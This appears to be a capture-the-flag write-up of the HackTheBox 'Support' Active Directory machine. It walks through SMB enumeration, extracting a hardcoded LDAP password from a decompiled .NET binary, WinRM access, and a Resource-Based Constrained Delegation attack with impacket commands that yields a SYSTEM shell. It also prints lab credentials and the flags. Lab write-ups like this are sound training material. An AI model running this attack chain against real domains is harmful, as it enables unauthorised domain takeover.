---
title: "HTB-Support-Easy"
date: "2025-11-26"
platform: "HackTheBox"
category: "Windows Active Directory"
difficulty: "Easy"
tags: [
  "SMB Enumeration",
  ".NET Reverse Engineering",
  "XOR Decryption",
  "LDAP Enumeration",
  "BloodHound",
  "Apache Directory Studio",
  "WinRM",
  "RBCD",
  "Resource-Based Constrained Delegation",
  "Kerberos",
  "impacket",
  "addcomputer",
  "getST",
  "Privilege Escalation",
  "Domain Admin"
]
excerpt: "An Active Directory machine involving SMB enumeration, decompiling a .NET executable to extract LDAP credentials, AD user discovery via LDAP, WinRM access, and full domain compromise using Resource-Based Constrained Delegation (RBCD) with Impacket."
readingTime: 20
featured: true
---


## Initial Reconnaissance

### Port Scanning with Nmap

Let's start by scanning all ports to see what services are running:

```bash
nmap --privileged -sV -sC -p- -vv -T4 -o support_nmap.txt 10.10.11.174
```

**Key Services Identified:**

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds? (SMB)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp  open  mc-nmf        .NET Message Framing
```

**Key Observations:**

- Domain: `support.htb`
- DC hostname: `DC`
- Standard AD services present
- SMB is accessible (Port 445)
- WinRM available for remote access

---

## SMB Enumeration

Let's check what SMB shares are available with anonymous access:

![image](1.png)

Excellent! We found a readable share called **`support-tools`**. Time to see what's inside! 🔍

### Exploring the support-tools Share

Inside the share, we discover multiple files, but one stands out: **`UserInfo.exe.zip`**

Let's download it and extract:

```bash
unzip UserInfo.exe.zip
```

We now have a suspicious Windows executable. Time for some reverse engineering! 💻

---

## Reverse Engineering UserInfo.exe

### Setting Up .NET Decompilation

Since this is a .NET executable, we can decompile it back to readable C# code. Here's how:

**Method 1: Using ILSpy Extension in VS Code**

1. **Install the extension:**
    
    ```bash
    code --install-extension icsharpcode.ilspy-vscode
    ```
    
2. **Open the assembly:**
    
    - Press `Ctrl+Shift+P` (or `Cmd+Shift+P` on Mac)
    - Type "ILSpy: Open Assembly"
    - Select the `UserInfo.exe` file
3. **Browse and decompile:**
    
    - The extension shows a tree view of namespaces, types, and members
    - Click any item to see decompiled C# code

**Alternative:** You could also use `strings` command, but decompiling gives us much better context!

### Finding the Hidden Credentials

After decompiling, we discover something interesting in the code:

![image](2.png)

The code reveals:

- A hardcoded password that's been **XOR encrypted**
- The encryption key: `armando`
- A function to decrypt the password

By reversing the XOR encryption with the key "armando", we extract the credentials:

```
Username: ldap
Password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Jackpot! 🎯 We have LDAP credentials!

---

## LDAP Enumeration

### Method 1: Using BloodHound

Let's map out the Active Directory environment:

```bash
bloodhound-python -u 'ldap' \
  -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -d 'support.htb' \
  -ns 10.10.11.174 \
  -c All
```

### Method 2: Using ldapsearch (Command Line)

We can also manually query LDAP:

```bash
ldapsearch -H ldap://support.htb \
  -D 'ldap@support.htb' \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" > ldap.out
```

Searching through the output for `CN=support`, we find interesting information:

![image](3.png)

### Method 3: Using Apache Directory Studio (GUI Tool)

For a more visual approach, we can use **Apache Directory Studio**:

🔗 **Download:** https://directory.apache.org/studio/

**Setup Steps:**

1. Install Apache Directory Studio on Linux
2. Create a new LDAP connection
3. Enter connection details:
    - Hostname: `support.htb`
    - Port: `389`
    - Bind DN: `ldap@support.htb`
    - Password: `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

Navigate through the directory tree to find users:

![image](4.png)

**Credentials Found:**

```
Username: support
Password: Ironside47pleasure40Watchful
```

Perfect! Now we have user credentials! 🎉

---

## User Flag - Getting Initial Access

Let's connect via WinRM using the support credentials:

```bash
evil-winrm -i support.htb \
  -u support \
  -p 'Ironside47pleasure40Watchful'
```

**User Flag:** `84813e9199c77e1243b7bbd16176757a` ✅

---

## Privilege Escalation to Domain Admin

### Analyzing Permissions with BloodHound

Let's check what privileges the `support` user has:

![image](5.png)

**Critical Discovery:** The `support` user has permissions that allow us to perform a **Resource-Based Constrained Delegation (RBCD)** attack! 🔥

### What is RBCD?

Resource-Based Constrained Delegation allows us to:

1. Create a fake computer account
2. Configure delegation so our fake computer can impersonate any user to the Domain Controller
3. Request a service ticket as the Administrator
4. Access the DC with admin privileges

Let's execute this attack! 💪

---

## RBCD Attack Chain

### Step 1: Create a Fake Computer Account

First, we'll add a computer to the domain (the `support` user has this permission):

```bash
impacket-addcomputer support.htb/support:Ironside47pleasure40Watchful \
  -computer-name fakepc \
  -computer-pass Password@123 \
  -dc-ip 10.10.11.174
```

![image](6.png)

Success! Our fake computer `fakepc$` is now in the domain.

### Step 2: Configure Resource-Based Constrained Delegation

Now we configure the delegation so `fakepc$` can impersonate users to the Domain Controller:

```bash
impacket-rbcd support.htb/support:Ironside47pleasure40Watchful \
  -action write \
  -delegate-to 'DC$' \
  -delegate-from 'fakepc$' \
  -dc-ip 10.10.11.174
```

![image](7.png)

Excellent! The delegation is configured. Now `fakepc$` can impersonate any user (including Administrator) to the DC.

### Step 3: Request a Service Ticket as Administrator

Using our fake computer account, we request a service ticket while impersonating the Administrator:

```bash
impacket-getST support.htb/'fakepc$':Password@123 \
  -spn cifs/DC.support.htb \
  -impersonate administrator \
  -dc-ip 10.10.11.174
```

![image](8.png)

Perfect! We've obtained a Kerberos ticket for the Administrator account!

### Step 4: Export the Ticket

Set the ticket in our environment:

```bash
export KRB5CCNAME=administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
```

### Step 5: PSExec as Administrator

Finally, use PSExec with our Administrator ticket to get a SYSTEM shell:

```bash
impacket-psexec support.htb/administrator@DC.support.htb \
  -k \
  -no-pass \
  -dc-ip 10.10.11.174
```

![image](9.png)

**SYSTEM ACCESS ACHIEVED!** 🎉🏆

---

## Root Flag

```
Root Flag: 1ea883af980c1d8e4f135793a316214f
```
